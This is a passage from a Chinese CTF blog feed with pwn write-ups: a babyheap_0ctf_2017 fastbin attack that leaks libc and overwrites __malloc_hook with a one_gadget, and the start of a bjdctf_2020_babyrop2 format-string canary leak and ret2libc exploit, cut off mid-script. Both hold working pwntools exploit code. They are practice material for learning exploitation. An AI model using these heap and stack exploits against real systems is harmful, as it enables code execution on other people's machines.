punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>index2 的 fd 位 0x80 是因为堆始终是 <strong>4KB 对齐</strong> 的，所以 index4 的第一个字节 (小端序) 必定是 80（前面的 index0~3 都占了 0x20）</p>\n<p>【这里解释修改 index4 的 size 位，这里 index4 对应 chunk4】</p>\n<pre><code>查看其 chunksize 与相应的 fastbin_index 是否匹配，\n实际上 chunksize 的计算方法是 victim-&gt;size &amp; ~(SIZE_BITS))，\n而它对应的 index 计算方法为 (size) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3) - 2，\n这里 64位的平台对应的 SIZE_SZ 是8，则 fastbin_index 为 (size &gt;&gt; 4) - 2，\n那么我们将 small chunk 的 size 域改写成 0x21 即可。\n</code></pre>\n<p>3. 构造两个 index 指向同一个 chunk（index2，index4 都指向 chunk4）</p>\n<p>由于前面的溢出 index2 导致对应的 chunk2 的 fd 指向了 chunk4（此时 chunk2 在 fastbin 表里，所以使 chunk4 也在 fastbin 表中），此时 fastbin-&gt;chunk2-&gt;chunk4</p>\n<pre><code>allocate(0x10)  //index1，此时会将chunk2分配给index1\nallocate(0x10)  //index2，此时会将chunk4分配给index2\n</code></pre>\n<p>此时就有两个 index 指向同一个 chunk 了，接着改回来原来的 index4 的大小</p>\n<pre><code>payload3=p64(0)+p64(0)\npayload3+=p64(0)+p64(0x91)\nfill(3,length(payload3),payload3)\n</code></pre>\n<p>接着给 index4 分配 chunk4（因为前面 index2 回收 chunk4 没有改变 index4 指向的 chunk 地址，所以给 index 分配的仍然是 chunk4）</p>\n<pre><code>allocate(0x80) //给index4分配chunk4\nfree(4)  //释放chunk4，因为大于等于0x80，所以进入unsorted bin中\n</code></pre>\n<p>此时 chunk4 的 fd 和 bk 就指向 <code>main_arena+88</code>  处</p>\n<p>4. 泄露 <code>main_arena_88</code>  地址，计算得到 libc_base（ <strong>main_arena 相对 libc 固定偏移 0x3c4b20, 不同 libc 版本偏移不同</strong> ）</p>\n<pre><code>dump(2)\nmain_arena_88=u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')\nlibc_base=main_arena_88-0x3c4b78   (0x3c4b0+88,一般2.23_64的偏移都是这个，不同libc版本会有不同\n</code></pre>\n<p>5. 构造 <code>fake_chunk</code> ，使其能够溢出到 <code>malloc_hook</code></p>\n<p>计算 fake_chunk 的地址（ <code>malloc_hook</code>  就在 <code>main_arena</code>  的上面，我们需要找一个 <code>malloc_hook</code>  附近能够构造 chunk 的地址作为 <code>fake_chunk</code> ）：</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/14/pPRXwTK.png\" alt=\"\" /></p>\n<p>在 <code>main_arena-0x40+0xd</code>  的地方找到该地址，由于有保护，所以要用 <code>libc_base+偏移</code> 来到达该地址</p>\n<pre><code>fake_chunk=main_arena-0x40+0xd (mian_arena-0x33)\nlibc_base=main_arena+0x58-0x3c4b78\n(main_arena-0x3c4b78=libc_base-0x58)\t\n\nfake_chunk=libc_base-0x58+0x3c4b78-0x40+0xd= libc_base+3c4aed \n</code></pre>\n<p>所以 <code>fake_chunk= libc_base+0x3c4aed</code></p>\n<p>6. 将 fake_chunk 地址写入 fastbin 中，便于后续溢出来 getshell</p>\n<p>由于此时 chunk4 仍然在 unsorted bin 中（index4 被释放），而 index2 仍然指向 chunk4，可以用 index2 来改写 fd，所以要使 chunk4 进入 fastbin 中</p>\n<pre><code>allocate(0x60) //回收一部分chunk4\nfree(4)  //使chunk4进入fastbin中\n\npayload4=p64(fake_chunk)  //改写chunk4的fd使fake_chunk进入fastbin\nfill(2,length(payload4),payload4)\n</code></pre>\n<p>7. 回收 chunk4 与 fake_chunk 来 getshell (  <code>malloc_hook=main_arena-0x10</code>  )</p>\n<pre><code>allocate(0x60)  //index4，分配chunk4\nallocate(0x60)  //index5，分配fake_chunk\n\n//因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33\n//所以 malloc_hook=fake_chunk+0x23(fake_chunk+0x33-0x10)\n\npayload5=p64(0)+p64(0)+p8(0)*3 //0x13\npayload5+=p64(libc_base+0x4526a) //0x4526a由one_gadget查找得到\nfill(5，length(payload5),payload5)\n\nallocate(0x60) //执行一次就会执行malloc_hook，就可以getshell\n</code></pre>\n<p>通过别人的 wp 发现 one_gadget 找出来的地址不对的原因：<br />\n<strong>值得注意的是，<br />\n这道题在于 2017 年的 0ctf 上的赛题，在当时使用 libc2.23-0ubuntu11.2 版本的共享库，但时至今日，Ubuntu16 已经不再使用该版本，而是 libc2.23-0ubuntu11.3 版本共享库，而 buu 上也使用前者版本，只能通过一些以前的 wp 来获取当时版本的 one_gadget，这里记一下比较常用的</strong></p>\n<pre><code>og1=[0x45216,0x4526a,0xf02a4,0xf1147]    #libc2.23-0ubuntu11.2\nog2=[0x45226,0x4527a,0xf0364,0xf1207]    #libc2.23-0ubuntu11.3\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b2thbWVpbmUudG9wLzIwMjEvMDgvMDkvYmFieWhlYXBfMGN0Zl8yMDE3Lw==\">https://tokameine.top/2021/08/09/babyheap_0ctf_2017/</span><br />\nexp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25727</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#e=ELF(\"./babyheap_0ctf_2017\")</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#write_plt=e.plt[\"write\"]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#read_plt=e.plt[\"read\"]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">allocate</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#此处必须转成 str（）类型，下面同理</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fill</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Size: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Content: \"</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Command: \"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Index: \"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">#步骤 1（对应上面的讲解步骤）</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\">#步骤 2</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>payload1<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>payload2<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#步骤 3</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload3<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#步骤 4</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>main_arena_88<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>libc_base<span class=\"token operator\">=</span>main_arena_88<span class=\"token operator\">-</span><span class=\"token number\">0x3c4b78</span> </pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token comment\">#步骤 5</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span> libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x3c4aed</span> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\">#步骤 6</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#回收一部分 chunk4</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#使 chunk4 进入 fastbin 中</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>payload4<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span>  <span class=\"token comment\">#改写 chunk4 的 fd 使 fake_chunk 进入 fastbin</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload4<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre><span class=\"token comment\">#步骤 7</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#index4，分配 chunk4</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#index5，分配 fake_chunk</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token comment\">#因为 malloc_hook=main_arena-0x10，fake_chunk=mian_arena-0x33</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token comment\">#所以 malloc_hook=fake_chunk+0x23 (fake_chunk+0x33-0x10)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>payload5<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p8<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>  <span class=\"token comment\">#0x13</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>payload5<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>libc_base<span class=\"token operator\">+</span><span class=\"token number\">0x4526a</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#0x4526a 由 one_gadget 查找得到</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>fill<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload5<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>allocate<span class=\"token punctuation\">(</span><span class=\"token number\">0x60</span><span class=\"token punctuation\">)</span>               <span class=\"token comment\">#index6, 执行一次就会执行 malloc_hook，就可以 getshell</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/14/pPW9VAI.png\" alt=\"\" /></p>\n<p>参考：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RoaW5rX3ljeC9hcnRpY2xlL2RldGFpbHMvNzc5ODI0Mzk=\">https://blog.csdn.net/think_ycx/article/details/77982439</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjIzNDYxLmh0bQ==\">https://bbs.kanxue.com/thread-223461.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5\">https://blog.csdn.net/weixin_43847969/article/details/104897249</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYS9hcnRpY2xlL2RldGFpbHMvMTA4MzYwMzc1\">https://blog.csdn.net/mcmuyanga/article/details/108360375</span></p>\n<p>关于堆的参数：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OS9hcnRpY2xlL2RldGFpbHMvMTA0ODk3MjQ5\">https://blog.csdn.net/weixin_43847969/article/details/104897249</span></p>\n",
            "tags": [
                "pwn",
                "fastbin.attack"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_babyrop2/",
            "url": "https://vvwwvv.cn/2023/09/12/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_babyrop2/",
            "title": "bjdctf_2020_babyrop2（格式化字符串漏洞）",
            "date_published": "2023-09-12T13:08:15.000Z",
            "content_html": "<h1 id=\"bjdctf_2020_babyrop2\"><a class=\"anchor\" href=\"#bjdctf_2020_babyrop2\">#</a> bjdctf_2020_babyrop2</h1>\n<h2 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h2>\n<p>题目开启了 canary，不能随意进行栈溢出<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7AOA.png\" alt=\"\" /></p>\n<p>ida 反汇编查看</p>\n<p>mian（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7Gmn.png\" alt=\"\" /><br />\n看到有三个函数</p>\n<p>init（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7Jwq.png\" alt=\"\" /><br />\n输出字符串</p>\n<p>gift（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7UYT.png\" alt=\"\" /><br />\n看到有个 <code>printf()</code> ，加上 <code>canary</code>  联想到 <code>格式化字符串漏洞</code> ，用来泄露 canary 的值，然后再进行栈溢出</p>\n<p>vuln（）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPI7afU.png\" alt=\"\" /><br />\n看到 <code>read()</code>  可以进行溢出</p>\n<h2 id=\"2查看canary的值\"><a class=\"anchor\" href=\"#2查看canary的值\">#</a> 2. 查看 canary 的值</h2>\n<p>输入点参数在栈上的相对位置（找偏移量），之前我都是输入 aaa %08x %08x……%08x 这样的字符串去找偏移的，这次不可以（限定了 6 个宽度的的输入），换了一种方法，输入 <code>%n$p</code> ,n 是偏移量，配上 <code>%$p</code>  就能定位到偏移量处，输出该位置上的内容</p>\n<p>此处一个一个试发现偏移是 6 (相对我们输入数据的位置)，输入值： <code>aa%6$p</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/21/pPIX16U.md.png\" alt=\"\" /><br />\n通过我们输入的值在栈上的位置往后查找，发现下一个位置有奇怪的一串数字，认定它为 <code>canary</code>  的值（要在栈上），而且它在 rbp 的上面<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/21/pPIXafx.png\" alt=\"\" /></p>\n<p>接着确定一下 <code>vuln()</code>  函数中 <code>canary</code>  位置，发现 rbp 位置与上面相同， <code>canary</code>  也在上面，也能通过 <code>rsp</code>  后面的 626262（bbb）, 确定我们的输入位置<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/22/pPoYYb6.png\" alt=\"\" /></p>\n<p>发现 <code>canary</code>  是距离我们输入位置 <code>0x18</code>  处，绕过 <code>canary</code>  后可以进行构造 <code>ret2libc</code></p>\n<p><s>如果相对栈起始偏移不变，那么我们输入的值也不是在栈的起始位置，，并不是，因为我们输入的值是在起始处，只是利用了格式化字符串......(此处为为我没想明白的地方：为什么我们输入的格式化字符串的值是在栈上有偏移的，而后面的栈溢出却是从栈顶开始的)</s></p>\n<h2 id=\"3exp\"><a class=\"anchor\" href=\"#3exp\">#</a> 3.exp</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./bjdctf_2020_babyrop2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./bjdctf_2020_babyrop2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',25714)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>read_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>printf_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"printf\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x400993</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>vuln<span class=\"token operator\">=</span><span class=\"token number\">0x0400887</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"help u!\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%7$p\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">\"%7$p\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>stroy<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token 